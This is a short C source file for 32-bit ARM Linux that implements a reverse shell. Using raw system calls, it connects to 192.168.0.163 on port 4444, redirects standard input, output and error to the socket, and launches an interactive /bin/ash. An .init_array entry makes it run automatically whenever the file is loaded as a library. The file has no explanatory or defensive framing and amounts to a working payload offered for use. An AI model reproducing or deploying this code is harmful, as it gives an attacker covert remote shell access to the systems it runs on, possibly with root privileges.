typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;

static long sc(long n,long a,long b,long c){
 register long r7 __asm__("r7")=n,r0 __asm__("r0")=a,r1 __asm__("r1")=b,r2 __asm__("r2")=c;
 __asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2):"memory");return r0;
}
static void run(void){
 struct {u16 family,port;u32 addr;u8 zero[8];} sa={2,0x5c11,0xa300a8c0,{0}};
 long s=sc(281,2,1,0);if(s<0)return;
 if(sc(283,s,(long)&sa,16)<0)return;
 long c=s;
 static char hello[]="ROOT_TRANSPORT_OK\n",fail[]="EXECVE_FAILED\n";
 sc(4,c,(long)hello,sizeof(hello)-1);
 sc(63,c,0,0);sc(63,c,1,0);sc(63,c,2,0);
 sc(4,1,(long)hello,sizeof(hello)-1);
 static char sh[]="/bin/ash",arg0[]="/bin/ash",argi[]="-i",path[]="PATH=/sbin:/usr/sbin:/bin:/usr/bin";
 char *argv[]={arg0,argi,0};char *envp[]={path,0};
 sc(11,(long)sh,(long)argv,(long)envp);
 sc(4,1,(long)fail,sizeof(fail)-1);
}
__attribute__((section(".init_array"),used))static void(*init_entry)(void)=run;
void _start(void){run();sc(1,0,0,0);}
